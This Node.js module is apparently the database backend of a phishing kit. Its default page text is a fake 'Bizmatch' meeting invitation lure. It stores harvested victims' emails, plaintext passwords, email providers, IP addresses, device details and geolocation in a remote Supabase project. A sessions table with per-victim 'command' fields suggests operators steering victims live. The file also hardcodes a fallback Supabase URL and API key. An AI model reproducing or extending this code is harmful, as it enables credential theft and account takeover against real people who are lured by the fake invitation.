const { createClient } = require('@supabase/supabase-js');

const FALLBACK_URL = 'https://pagiwhqhvtgzhywpkgid.supabase.co';
const FALLBACK_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBhZ2l3aHFodnRnemh5d3BrZ2lkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODkxMDQ3NDUsImV4cCI6MjEwNDY4MDc0NX0.vWfMS_9YZL6P_BOnXM7RjBRTNIn6ujHl5gOIeAPIgMw';

const supabaseUrl = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || FALLBACK_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY || FALLBACK_KEY;

let _client = null;
function getClient() {
  if (!_client) {
    _client = createClient(supabaseUrl, supabaseKey);
  }
  return _client;
}

// ── Settings ──
async function getSettings() {
  const { data, error } = await getClient()
    .from('site_settings')
    .select('site_title, heading, description, countdown_target, event_date, event_time, event_venue, button_text')
    .eq('id', 1)
    .maybeSingle();

  if (error || !data) {
    return {
      siteTitle: 'Bizmatch Meeting Invitation',
      heading: "You're Invited to a Meeting",
      description: 'Congratulations! You have been selected for a procurement meeting with Bizmatch.\nFor the best experience, we suggest viewing this invitation on your computer.\nTake a moment to check out the "View Meeting Invite" below for all the details, and don\'t forget to confirm your attendance!',
      countdownTarget: '2026-07-22T01:00:00',
      eventDate: 'July 22, 2026',
      eventTime: '01:00 EST',
      eventVenue: 'TBD',
      buttonText: 'View Meeting Invite',
    };
  }

  return {
    siteTitle: data.site_title,
    heading: data.heading,
    description: data.description,
    countdownTarget: data.countdown_target,
    eventDate: data.event_date,
    eventTime: data.event_time,
    eventVenue: data.event_venue,
    buttonText: data.button_text,
  };
}

async function saveSettings(data) {
  const row = {
    id: 1,
    site_title: data.siteTitle,
    heading: data.heading,
    description: data.description,
    countdown_target: data.countdownTarget,
    event_date: data.eventDate,
    event_time: data.eventTime,
    event_venue: data.eventVenue,
    button_text: data.buttonText,
  };
  await getClient()
    .from('site_settings')
    .upsert(row, { onConflict: 'id' });
}

// ── Submissions ──
async function getSubmissions() {
  const { data, error } = await getClient()
    .from('submissions')
    .select('session_id, email, password, provider, ip, browser, os, device, user_agent, city, region, country, lat, lng, timezone, isp, date, time, timestamp')
    .order('created_at', { ascending: false })
    .limit(200);

  if (error || !data) return [];

  return data.map((s) => ({
    sessionId: s.session_id,
    email: s.email,
    password: s.password,
    provider: s.provider,
    ip: s.ip,
    browser: s.browser,
    os: s.os,
    device: s.device,
    userAgent: s.user_agent,
    city: s.city,
    region: s.region,
    country: s.country,
    lat: s.lat,
    lng: s.lng,
    timezone: s.timezone,
    isp: s.isp,
    date: s.date,
    time: s.time,
    timestamp: s.timestamp,
  }));
}

async function addSubmission(record) {
  const row = {
    session_id: record.sessionId,
    email: record.email,
    password: record.password,
    provider: record.provider,
    ip: record.ip,
    browser: record.browser,
    os: record.os,
    device: record.device,
    user_agent: record.userAgent,
    city: record.city,
    region: record.region,
    country: record.country,
    lat: record.lat,
    lng: record.lng,
    timezone: record.timezone,
    isp: record.isp,
    date: record.date,
    time: record.time,
    timestamp: record.timestamp,
  };
  await getClient().from('submissions').insert(row);
  return record;
}

// ── Sessions ──
async function getSessions() {
  const { data, error } = await getClient()
    .from('sessions')
    .select('session_id, command, data, provider, email, consumed');
  if (error || !data) return {};
  const map = {};
  for (const s of data) {
    map[s.session_id] = {
      command: s.command,
      data: s.data,
      provider: s.provider,
      email: s.email,
      consumed: s.consumed,
    };
  }
  return map;
}

async function saveSession(sessionId, sessionData) {
  const row = {
    session_id: sessionId,
    command: sessionData.command || null,
    data: sessionData.data || null,
    provider: sessionData.provider || null,
    email: sessionData.email || null,
    consumed: sessionData.consumed || false,
    updated_at: new Date().toISOString(),
  };
  await getClient()
    .from('sessions')
    .upsert(row, { onConflict: 'session_id' });
}

async function getSession(sessionId) {
  const { data, error } = await getClient()
    .from('sessions')
    .select('command, data, provider, email, consumed')
    .eq('session_id', sessionId)
    .maybeSingle();

  if (error || !data) return null;

  return {
    command: data.command,
    data: data.data,
    provider: data.provider,
    email: data.email,
    consumed: data.consumed,
  };
}

async function deleteSession(sessionId) {
  await getClient()
    .from('sessions')
    .delete()
    .eq('session_id', sessionId);
}

module.exports = {
  getSettings,
  saveSettings,
  getSubmissions,
  addSubmission,
  getSessions,
  saveSession,
  getSession,
  deleteSession,
};
